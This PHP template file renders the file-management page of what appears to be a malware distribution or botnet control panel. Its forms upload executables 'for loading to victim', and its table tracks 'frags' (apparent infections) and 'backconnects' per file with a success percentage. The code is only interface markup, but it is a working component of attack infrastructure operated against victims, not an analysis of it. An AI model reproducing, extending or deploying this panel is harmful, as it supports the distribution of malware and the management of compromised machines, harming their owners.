<?php

$fileadded = isset($_Messages['FileAdded']) ? "<b style='color: green;'>File added</b><br><br>" : "";
$filenoadded = isset($_Messages['FileNoAdded']) ? "<b style='color: red;'>File is not uploaded</b><br><br>" : "";


if (isset($_GET['edit_id'])){
	$fileedit =<<<EOF
	<table cellpadding="0" cellspacing="0">
	<tr>
		<td width="3"><img src="./images/stl.gif" width="3" height="3"></td>
		<td bgcolor="#273238"></td>
		<td width="3"><img src="./images/str.gif" width="3" height="3"></td>
	</tr>
	<tr>
		<td bgcolor="#273238"></td>
		<td bgcolor="#273238" style="padding: 5px;">
			<b>Edit file:</b>
			<form method="post" id="filesedit" action="{$_SERVER['PHP_SELF']}?c=files&edit_id={$file['id']}" style="margin: 0px;" enctype="multipart/form-data">
			<input type="hidden" name="action" value="edit">
			<table>
			<tr>
				<td>File descriotion:</td>
				<td><input type="text" name="description" style="width: 129px;" value="{$file['description']}"></td>
			</tr>
			<tr>
				<td>File name (for loading to victim *.exe):</td>
				<td><input type="text" name="name" style="width: 129px;" value="{$file['name']}"></td>
			</tr>
			<tr>
				<td valign="top">Uploading file (to replace old file):</td>
				<td><input type="file" name="filedata"></td>
			</tr>
			<tr>
				<td>&nbsp;</td>
				<td><input type="image" src="./images/button.gif" width="129" height="25"><a href="javascript:document.getElementById('filesedit').submit();" style="color: white; text-decoration: none; font-weight: bold; position: relative; top: -8px; left: -77px;">Edit</a></td>
			</tr>
			</table>
			</form>
		</td>
		<td bgcolor="#273238"></td>
	</tr>
	<tr>
		<td><img src="./images/sbl.gif" width="3" height="3"></td>
		<td bgcolor="#273238"></td>
		<td><img src="./images/sbr.gif" width="3" height="3"></td>
	</tr>
	</table>
	<br>
EOF;
} else {
	$fileedit = "";
}


$filesdata = "";
for ($i = 0; $i < count($files); $i++){
	$filesdata .= "
	<tr>
	<td class='tdb'><a href='" . $_SERVER['PHP_SELF'] . "?c=files&edit_id=" . $files[$i]['id'] . "' class='al'>edit</a></td>
	<td class='tdb'>&nbsp;<a href='" . $_SERVER['PHP_SELF'] . "?c=files&delete_id=" . $files[$i]['id'] . "' class='al'>delete</a>&nbsp;</td>
	<td class='tdb'>" . (isset($files[$i]['description']) ? $files[$i]['description'] : "<i>no description</i>") . "</td>
	<td class='tdb'>" . $files[$i]['name'] . "</td>
	<td class='tdb' align='center'>" . $files[$i]['frags'] . "</td>
	<td class='tdb' align='center'>" . $files[$i]['backconnects'] . "</td>
	<td class='tdb' align='center'>" . (($files[$i]['backconnects'] == 0) ? "0" : round(($files[$i]['backconnects'] / $files[$i]['frags'] * 100), 2)) . "%</td>
	</tr>
	";
}
if (count($files) == 0){
	$filesdata = "<tr><td colspan='7'>File list is empty</td></tr>";
}

$CONTENT =<<<EOF
{$fileadded}
{$filenoadded}
{$fileedit}

<table cellpadding="0" cellspacing="0">
<tr>
	<td width="3"><img src="./images/stl.gif" width="3" height="3"></td>
	<td bgcolor="#273238"></td>
	<td width="3"><img src="./images/str.gif" width="3" height="3"></td>
</tr>
<tr>
	<td bgcolor="#273238"></td>
	<td bgcolor="#273238" style="padding: 5px;">
		<img src="./images/icona.gif" width="15" height="15" align="absmiddle">&nbsp;<a href="javascript://" onclick="if (document.getElementById('addfile').style.display == 'none'){ document.getElementById('addfile').style.display = 'block'; } else { document.getElementById('addfile').style.display = 'none'; }"><b>Add file</b></a>
		<div style="display: none;" id="addfile">
		<form method="post" action="{$_SERVER['PHP_SELF']}?c=files" id="files" style="margin: 0px;" enctype="multipart/form-data">
		<input type="hidden" name="action" value="add">
		<table>
		<tr>
			<td>File descriotion:</td>
			<td><input type="text" name="description" style="width: 129px;"></td>
		</tr>
		<tr>
			<td>File name (for loading to victim *.exe)</td>
			<td><input type="text" name="name" style="width: 129px;"></td>
		</tr>
		<tr>
			<td valign="top">Uploading file:</td>
			<td><input type="file" name="filedata"></td>
		</tr>
		<tr>
			<td>&nbsp;</td>
			<td><input type="image" src="./images/button.gif" width="129" height="25"><a href="javascript:document.getElementById('files').submit();" style="color: white; text-decoration: none; font-weight: bold; position: relative; top: -8px; left: -77px;">Add</a></td>
		</tr>
		</table>
		</form>
		</div>
	</td>
	<td bgcolor="#273238"></td>
</tr>
<tr>
	<td><img src="./images/sbl.gif" width="3" height="3"></td>
	<td bgcolor="#273238"></td>
	<td><img src="./images/sbr.gif" width="3" height="3"></td>
</tr>
</table>



<br>
<div class="pdlt">
	<b>Files list:</b>
	<table cellpadding="0" cellspacing="0" width="720">
	<tr>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td class="tbg"><nobr>&nbsp;File description&nbsp;</td>
		<td class="tbg"><nobr>&nbsp;File name&nbsp;</td>
		<td class="tbg"><nobr>&nbsp;Frags&nbsp;</td>
		<td class="tbg"><nobr>&nbsp;Feedbacks&nbsp;</td>
		<td class="tbg"><nobr>&nbsp;Percentage feedbacks&nbsp;</td>
	</tr>
	{$filesdata}
	</table>
</div>
EOF;


?>